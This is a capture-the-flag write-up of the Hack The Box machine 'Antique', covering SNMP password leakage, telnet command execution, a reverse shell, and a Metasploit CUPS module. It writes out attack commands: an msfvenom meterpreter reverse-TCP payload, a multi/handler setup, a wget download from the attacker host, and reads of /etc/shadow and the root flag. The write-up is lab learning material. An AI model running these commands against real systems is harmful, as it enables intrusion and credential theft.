# Antique

This is my write-up for the machine **Antique** located at: [https://app.hackthebox.com/machines/Antique](https://app.hackthebox.com/machines/Antique).

{% hint style="info" %}
I am a beginner at penetration testing, so I will be referencing the Official Hack The Box Walk-through for this machine.
{% endhint %}

From the tags, I am able to notice that this machine is about printer exploitation on Linux:

![](<../../.gitbook/assets/image (530).png>)

A basic nmap scan shows that only telnet is online:

![](<../../.gitbook/assets/image (393).png>)

Trying to telnet into the system, it asks for a password:

I also had a deeper nmap scan running: `nmap -A -T4 -p- 10.10.11.107 -oN antique.nmap`

This nmap scan came back with pretty much the same information. I then viewed the walk-through to see where I had messed up. I learned about a tool called **snmpwalk**. In the walk-through, the author runs `snmpwalk -v 2c -c public 10.10.11.107`, which gets the following output:

![](<../../.gitbook/assets/image (400).png>)

I had actually had found the password for telnet on my own, but I was unable to decode it:

![](<../../.gitbook/assets/image (405).png>)

I use **snmpget**, while the walk-through used **snmpwalk**. In the walk-through they used **binascii** (python import) in order to decode the bytes. I wanted to find a solution that was a bit more basic. I ended up using [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html) to convert the bytes from hex to ascii:

![](<../../.gitbook/assets/image (629).png>)

The password seems to be: **P@ssw0rd@123!!123** I was in!

![](<../../.gitbook/assets/image (326).png>)

I then noticed the walk-through mentioned to run `exec id`. I then tried playing around with linux commands, and ended up finding the user.txt file:

![](<../../.gitbook/assets/image (329).png>)

I noticed the write-up use python for the reverse shell. I then used [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) to see if I can use one of their python commands. Once I changed their python command from **python** to **python3**, it worked:

![](<../../.gitbook/assets/image (677).png>)

![](<../../.gitbook/assets/image (691).png>)

I viewed the walk-through again to see what I missed. The walk-through author runs the netstat command to see what connections are there:

![](<../../.gitbook/assets/image (619).png>)

They then go on to say that we should use **chisel** to connect to the port. I ran into an issue here where I was unable to download a GitHub repository onto the machine itself. I then realize that you make the binary locally and then upload it to the server. I uploaded the file to the machine by running `python3 -m http.server` on the folder where chisel was downloaded. I was then able to upload it by running `wget http://10.10.14.10:8000/chisel` on the remote machine. When I uploaded the file, I was unable to run it due to some dependency error in terms of version of libc:

![](<../../.gitbook/assets/image (715) (1).png>)

I then followed [this write-up](https://howtohack44323049.wordpress.com/2021/12/13/htb\_antique\_eng/) to see what I missed and what I could have done instead. They run `wget localhost:631`, which makes a file called **index.html** in the folder you are in. There, you can see that CUPS is mentioned:

![](<../../.gitbook/assets/image (498).png>)

When we search for cups on metasploit we get the following:

![](<../../.gitbook/assets/image (476) (1).png>)

We first make a shell file to upload to the server. To do this, the walk-through mentioned previously mentions `msfvenom -p linux/x64/meterpreter/reverse`_`tcp LHOST=<`_`YOUR-IP> LPORT=1337 --format elf > shell`. This will make the **shell** file in your directory. To move it to the remote machine, you can use the python http.server command mentioned previously. Before I ran the shell executable, I ran the following commands in Metasploit (based off of [this write-up](https://howtohack44323049.wordpress.com/2021/12/13/htb\_antique\_eng/)):

```
use exploit/multi/handler
set lhost <YOUR_IP>
set lport 1337
set payload linux/x64/meterpreter/reverse_tcp 
run
```

After I ran the **run** command, I then switched to the remote machine and ran the shell executable (run `chmod +x shell` to make it executable). This gave me a connection in Metasploit:

![](<../../.gitbook/assets/image (632).png>)

I then ran the following commands to look for the cups post exploitation program:

![](<../../.gitbook/assets/image (331).png>)

I then hit run and got an output:

![](<../../.gitbook/assets/image (617).png>)

Opening that file shows the output of /etc/shadow:

![](<../../.gitbook/assets/image (543).png>)

Since we want to get the output of /root/root.txt, I changed my option in metasploit to that:

![](<../../.gitbook/assets/image (419).png>)

Reading that file got me the root flag:

![](<../../.gitbook/assets/image (508) (1).png>)
